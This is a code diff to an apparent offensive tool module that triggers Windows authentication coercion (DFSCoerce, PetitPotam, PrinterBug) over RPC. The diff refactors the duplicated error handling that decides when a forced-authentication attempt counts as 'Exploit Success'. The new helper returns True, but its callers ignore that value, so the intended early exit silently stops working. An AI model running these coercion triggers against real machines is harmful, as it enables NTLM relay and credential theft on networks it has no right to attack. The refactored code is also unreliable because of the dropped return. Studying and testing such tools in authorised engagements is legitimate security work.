@@ -389,15 +389,7 @@ class DFSCoerceTrigger:
 
             dce.request(request)
         except Exception as e:
-            if str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_BAD_NETPATH") >= 0 or str(e).find("RPC_S_INVALID_NET_ADDR") >= 0:
-                self.context.log.debug("NetrDfsAddStdRootForced Success")
-                self.context.log.highlight(f"Exploit Success, {pipe}\\NetrDfsAddStdRootForced")
-                if not always_continue:
-                    return True
-            elif str(e).find("ERROR_NOT_SUPPORTED") >= 0:
-                self.context.log.debug("Not Vulnerable")
-            else:
-                self.context.log.debug(f"Something went wrong, check error status => {e!s}")
+            self.handle_exception(request.__class__.__name__, always_continue, pipe, e)
 
         self.context.log.debug("Sending NetrDfsAddRootTarget!")
         try:
@@ -421,15 +413,7 @@ class DFSCoerceTrigger:
             self.context.log.debug("NetrDfsAddRootTarget Success")
             return True
         except Exception as e:
-            if str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_BAD_NETPATH") >= 0 or str(e).find("RPC_S_INVALID_NET_ADDR") >= 0:
-                self.context.log.debug("NetrDfsAddRootTarget Success")
-                self.context.log.highlight(f"Exploit Success, {pipe}\\NetrDfsAddRootTarget")
-                if not always_continue:
-                    return True
-            elif str(e).find("ERROR_NOT_SUPPORTED") >= 0:
-                self.context.log.debug("Not Vulnerable")
-            else:
-                self.context.log.debug(f"Something went wrong, check error status => {e!s}")
+            self.handle_exception(request.__class__.__name__, always_continue, pipe, e)
 
         # Private exploit
         self.context.log.debug("Sending NetrDfsRemoveRootTarget!")
@@ -448,13 +432,7 @@ class DFSCoerceTrigger:
             self.context.log.debug("NetrDfsRemoveRootTarget Success")
             return True
         except Exception as e:
-            if str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_BAD_NETPATH") >= 0 or str(e).find("RPC_S_INVALID_NET_ADDR") >= 0:
-                self.context.log.debug("NetrDfsRemoveRootTarget Success")
-                self.context.log.highlight(f"Exploit Success, {pipe}\\NetrDfsRemoveRootTarget")
-                if not always_continue:
-                    return True
-            else:
-                self.context.log.debug(f"Something went wrong, check error status => {e!s}")
+            self.handle_exception(request.__class__.__name__, always_continue, pipe, e)
 
         self.context.log.debug("Sending NetrDfsManagerInitialize!")
         try:
@@ -469,15 +447,7 @@ class DFSCoerceTrigger:
 
             dce.request(request)
         except Exception as e:
-            if str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_BAD_NETPATH") >= 0 or str(e).find("RPC_S_INVALID_NET_ADDR") >= 0:
-                self.context.log.debug("NetrDfsAdd Success")
-                self.context.log.highlight(f"Exploit Success, {pipe}\\NetrDfsAdd")
-                if not always_continue:
-                    return True
-            elif str(e).find("ERROR_NOT_SUPPORTED") >= 0:
-                self.context.log.debug("Not Vulnerable")
-            else:
-                self.context.log.debug(f"Something went wrong, check error status => {e!s}")
+            self.handle_exception(request.__class__.__name__, always_continue, pipe, e)
 
         self.context.log.debug("Sending NetrDfsManagerInitialize!")
         try:
@@ -492,15 +462,7 @@ class DFSCoerceTrigger:
 
             dce.request(request)
         except Exception as e:
-            if str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_BAD_NETPATH") >= 0 or str(e).find("RPC_S_INVALID_NET_ADDR") >= 0:
-                self.context.log.debug("NetrDfsAdd Success")
-                self.context.log.highlight(f"Exploit Success, {pipe}\\NetrDfsAdd")
-                if not always_continue:
-                    return True
-            elif str(e).find("ERROR_NOT_SUPPORTED") >= 0:
-                self.context.log.debug("Not Vulnerable")
-            else:
-                self.context.log.highlight(f"Something went wrong, check error status => {e!s}")
+            self.handle_exception(request.__class__.__name__, always_continue, pipe, e)
 
         self.context.log.debug("Sending NetrDfsAddStdRoot!")
         try:
@@ -511,13 +473,7 @@ class DFSCoerceTrigger:
             request["ApiFlags"] = 0
             dce.request(request)
         except Exception as e:
-            if str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_BAD_NETPATH") >= 0 or str(e).find("RPC_S_INVALID_NET_ADDR") >= 0:
-                self.context.log.debug("NetrDfsAddStdRoot Success")
-                self.context.log.highlight(f"Exploit Success, {pipe}\\NetrDfsAddStdRoot")
-                if not always_continue:
-                    return True
-            else:
-                self.context.log.debug(f"Something went wrong, check error status => {e!s}")
+            self.handle_exception(request.__class__.__name__, always_continue, pipe, e)
 
         self.context.log.debug("Sending NetrDfsRemoveStdRoot!")
         try:
@@ -527,13 +483,18 @@ class DFSCoerceTrigger:
             request["ApiFlags"] = 0
             dce.request(request)
         except Exception as e:
-            if str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_BAD_NETPATH") >= 0 or str(e).find("RPC_S_INVALID_NET_ADDR") >= 0:
-                self.context.log.debug("NetrDfsRemoveStdRoot Success")
-                self.context.log.highlight(f"Exploit Success, {pipe}\\NetrDfsRemoveStdRoot")
-                if not always_continue:
-                    return True
-            else:
-                self.context.log.debug(f"Something went wrong, check error status => {e!s}")
+            self.handle_exception(request.__class__.__name__, always_continue, pipe, e)
+
+    def handle_exception(self, method_name, always_continue, pipe, e):
+        if str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_BAD_NETPATH") >= 0 or str(e).find("RPC_S_INVALID_NET_ADDR") >= 0:
+            self.context.log.debug(f"{method_name} Success")
+            self.context.log.highlight(f"Exploit Success, {pipe}\\{method_name}")
+            if not always_continue:
+                return True
+        elif str(e).find("ERROR_NOT_SUPPORTED") >= 0:
+            self.context.log.debug("Not Vulnerable")
+        else:
+            self.context.log.debug(f"Something went wrong, check error status => {e!s}")
 
 
 class PetitPotamtTrigger:
@@ -868,7 +829,7 @@ class PrinterBugTrigger:
 
         self.context.log.debug("Sending RpcRemoteFindFirstPrinterChangeNotification!")
         try:
-            resp = rprn.hRpcOpenPrinter(dce, "\\\\%s\x00" % target)
+            resp = rprn.hRpcOpenPrinter(dce, f"\\\\{target}\x00")
         except Exception as e:
             if str(e).find("Broken pipe") >= 0:
                 # The connection timed-out. Let's try to bring it back next round
@@ -892,7 +853,7 @@ class PrinterBugTrigger:
             request["pBuffer"] = NULL
             dce.request(request)
         except Exception as e:
-            if str(e).find("rpc_s_access_denied") >= 0:
+            if str(e).find("rpc_s_access_denied") >= 0 or str(e).find("RPC_S_SERVER_UNAVAILABLE") >= 0:
                 self.context.log.debug("RpcRemoteFindFirstPrinterChangeNotification Success")
                 self.context.log.highlight(f"Exploit Success, {pipe}\\RpcRemoteFindFirstPrinterChangeNotification")
                 if not always_continue:
